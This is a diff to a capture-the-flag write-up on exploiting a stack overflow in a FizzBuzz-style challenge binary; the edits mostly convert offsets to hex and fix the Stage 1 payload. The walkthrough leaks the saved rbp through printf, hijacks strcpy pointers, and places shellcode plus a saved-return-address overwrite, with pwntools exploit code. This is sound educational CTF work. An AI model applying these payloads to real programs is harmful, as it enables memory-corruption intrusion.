@@ -13875,7 +13875,7 @@ __int64 challenge()
 }
 ```
 
-The vulnerability is `read(0, input, 0x100)` writing into a buffer at `rbp−0x5C`, which overflows into the data above it on the stack. Because `arr` is a flat 13-element array, we can corrupt `arr[10]` (loop counter), `arr[11]` (strcpy source pointer), and `arr[12]` (strcpy destination pointer) simply by writing past offset +60. After each `read()`, the binary calls `strcpy(arr[12], arr[11])`, giving us a controlled write-what-where primitive every iteration.
+The vulnerability is `read(0, input, 0x100)` writing into a buffer at `rbp−0x5C`, which overflows into the data above it on the stack. Because `arr` is a flat 13-element array, we can corrupt `arr[10]` (loop counter), `arr[11]` (strcpy source pointer), and `arr[12]` (strcpy destination pointer) simply by writing past offset `+0x3C`. After each `read()`, the binary calls `strcpy(arr[12], arr[11])`, giving us a controlled write-what-where primitive every iteration.
 
 The frame is fixed-size (`sub rsp, 0x90`) and every offset is a compile-time constant from `rbp`.
 
@@ -13953,16 +13953,15 @@ flowchart TD
 
 The first Buzz iteration is `i = 5`. We burn iterations 0–4 with dummy newlines and send the Stage 1 payload on `i = 5`.
 
-`printf("You entered: %s\n", input)` starts printing from `rbp−0x5C` and stops at the first NULL byte. For it to reach `arr[11]` at offset +68, every byte from +0 to +67 must be non-NULL. There is one trap: `arr[9]` HIDWORD at offset +56 initially contains `"\n\0\0\0"`. That `\0` at offset +57 stops `printf` before it reaches the counter or `arr[11]`. The Stage 1 payload must overwrite those four bytes with non-NULL values (e.g. `b"CCCC"`) to bridge the gap. `BYTE4(arr[2]) = 0` runs *after* `printf`, so zeroing input[0] does not interfere with the spill.
+`printf("You entered: %s\n", input)` starts printing from `rbp−0x5C` and stops at the first NULL byte. For it to reach `arr[11]` at offset `+0x44`, every byte from `+0x00` to `+0x43` must be non-NULL. There is one trap: `arr[9]` HIDWORD at offset `+0x38` initially contains `"\n\0\0\0"`. That `\0` at offset `+0x39` stops `printf` before it reaches the counter or `arr[11]`. The Stage 1 payload must overwrite those four bytes with non-NULL values (e.g. `b"CCCC"`) to bridge the gap. `BYTE4(arr[2]) = 0` runs *after* `printf`, so zeroing input[0] does not interfere with the spill.
 
 Stage 1 payload on `i = 5` (Buzz branch):
 
 ```
-+0   b"A" × 52       pad through arr[3..9] low
-+52  b"BUZZ"         arr[9] LODWORD, non-NULL, keeps printf flowing
-+56  b"CCCC"         arr[9] HIDWORD, plugs the "\n\0" gap
-+60  b"D" × 4        arr[10] LODWORD, filler
-+64  p32(0xFFFFFFFF) arr[10] HIDWORD = −1, loop continues
++0x00  b"A" × 56       pad through arr[3..9] LODWORD, all non-NULL
++0x38  b"CCCC"         arr[9] HIDWORD, plugs the "\n\0" gap
++0x3C  b"D" × 4        arr[10] LODWORD, filler
++0x40  p32(0xFFFFFFFF) arr[10] HIDWORD = −1, loop continues
 ```
 
 ### Stage 1: Leaking the saved `rbp`
@@ -13989,9 +13988,9 @@ Stage 1 payload on `i = 5` (Buzz branch):
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp−0x30 │  41 41 41 41 41 41 41 41    │ v1[8]  = "AAAAAAAA"
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x28 │  42 55 5a 5a                │ v1[9]  LODWORD = "BUZZ", non-NULL
+   rbp−0x28 │  41 41 41 41                │ v1[9]  LODWORD = "AAAA", non-NULL pad (was 0x00000000)
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x24 │  43 43 43 43                │ v1[9]  HIDWORD = "CCCC", gap bridged
+   rbp−0x24 │  43 43 43 43                │ v1[9]  HIDWORD = "CCCC", non-NULL pad (was "Buzz\n")
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp−0x20 │  44 44 44 44                │ v1[10] LODWORD = "DDDD", filler
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14009,21 +14008,21 @@ Stage 1 payload on `i = 5` (Buzz branch):
             └─────────────────────────────┘
 ```
 
-We parse the 6 non-NULL bytes that `printf` spills from offset +68:
+We parse the 6 non-NULL bytes that `printf` spills from offset `+0x44`:
 
 ```python
 raw         = p.recvn(75)
-leaked_addr = u64(raw[68:74] + b"\x00\x00")   # arr[11] = rbp−0x24
+leaked_addr = u64(raw[0x44:0x4a] + b"\x00\x00")   # arr[11] = rbp−0x24
 rbp         = leaked_addr + 0x24
-sc_addr     = rbp - 0x58                       # shellcode lives at +4
+sc_addr     = rbp - 0x58                           # shellcode lives at +0x04
 saved_rip   = rbp + 0x08
 ```
 
 After this iteration the counter increments: −1 + 1 = 0. The next iteration starts at `i = 0` (FizzBuzz).
 
-For Stage 2, `i = 0` is FizzBuzz, so `arr[11]` will be set to `&fizzbuzz` (a BSS address) by the branch logic, but we overwrite `arr[11]` and `arr[12]` ourselves before `strcpy` fires, so the branch assignment doesn't matter. The shellcode must fit in 52 bytes (offset +4 to +55). `BYTE4(arr[2])` zeroes input[0] after `printf`, so the first 4 bytes are sacrificed as NOP sled. Shellcode starts at `rbp−0x58` = `sc_addr`.
+For Stage 2, `i = 0` is FizzBuzz, so `arr[11]` will be set to `&fizzbuzz` (a BSS address) by the branch logic, but we overwrite `arr[11]` and `arr[12]` ourselves before `strcpy` fires, so the branch assignment doesn't matter. The shellcode must fit in 0x34 bytes (offset `+0x04` to `+0x37`). `BYTE4(arr[2])` zeroes input[0] after `printf`, so the first 4 bytes are sacrificed as NOP sled. Shellcode starts at `rbp−0x58` = `sc_addr`.
 
-The NOP padding between the shellcode and `sc_addr` at offset +60 is pure filler, it pushes `p64(sc_addr)` rightward in the payload until it aligns with `arr[10]` at exactly offset +60. The shellcode is 31 bytes ending at offset +35, so 25 NOP bytes bridge the gap. Any non-NULL byte would work equally well here.
+The NOP padding between the shellcode and `sc_addr` at offset `+0x3C` is pure filler, it pushes `p64(sc_addr)` rightward in the payload until it aligns with `arr[10]` at exactly offset `+0x3C`. The shellcode is 0x1F bytes ending at offset `+0x23`, so 0x19 NOP bytes bridge the gap. Any non-NULL byte would work equally well here.
 
 ### Stage 2: shellcode
 
@@ -14039,13 +14038,13 @@ Stack after Stage 2 payload is received, before `strcpy` fires:
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp−0x5C │  90 90 90 90                │ v1[2]  HIDWORD = input; NOP sled, BYTE4 zeroed after printf
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x58 │  [ chmod shellcode  0..7 ]  │ v1[3]  = shellcode bytes 0–7    <- sc_addr
+   rbp−0x58 │  shellcode [ 0x00..0x07 ]   │ v1[3]  = shellcode bytes 0x00–0x07    <- sc_addr
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x50 │  [ chmod shellcode  8..15]  │ v1[4]  = shellcode bytes 8–15
+   rbp−0x50 │  shellcode [ 0x08..0x0F ]   │ v1[4]  = shellcode bytes 0x08–0x0F
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x48 │  [ chmod shellcode 16..23]  │ v1[5]  = shellcode bytes 16–23
+   rbp−0x48 │  shellcode [ 0x10..0x17 ]   │ v1[5]  = shellcode bytes 0x10–0x17
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-   rbp−0x40 │  [ chmod shellcode 24..30]  │ v1[6]  = shellcode bytes 24–30
+   rbp−0x40 │  shellcode [ 0x18..0x1E ]   │ v1[6]  = shellcode bytes 0x18–0x1E
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp−0x38 │  90 90 90 90 90 90 90 90    │ v1[7]  = NOP padding
             ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14092,13 +14091,15 @@ for i in range(5):
 # Stage 1: leak rbp via arr[11] spill at i=5 (Buzz branch)
 p.recvuntil(b"5: ")
 
-payload  = b"A" * 64
+payload  = b"A" * 0x38
+payload += b"CCCC"
+payload += b"D" * 4
 payload += p32(0xFFFFFFFF)
 p.send(payload)
 
 p.recvuntil(b"You entered: ")
-raw         = p.recvn(75)
-leaked_addr = u64(raw[68:74] + b"\x00\x00")
+raw         = p.recvn(0x4b)
+leaked_addr = u64(raw[0x44:0x4a] + b"\x00\x00")
 rbp         = leaked_addr + 0x24
 sc_addr     = rbp - 0x58
 holder      = rbp - 0x20
@@ -14131,11 +14132,11 @@ shellcode = asm("""
     syscall
 """)
 
-assert len(shellcode) == 31
+assert len(shellcode) == 0x1f
 
-payload  = b"\x90" * 4
+payload  = b"\x90" * 0x4
 payload += shellcode
-payload += b"\x90" * 25
+payload += b"\x90" * 0x19
 payload += p64(sc_addr)
 payload += p64(holder)
 payload += p64(saved_rip)
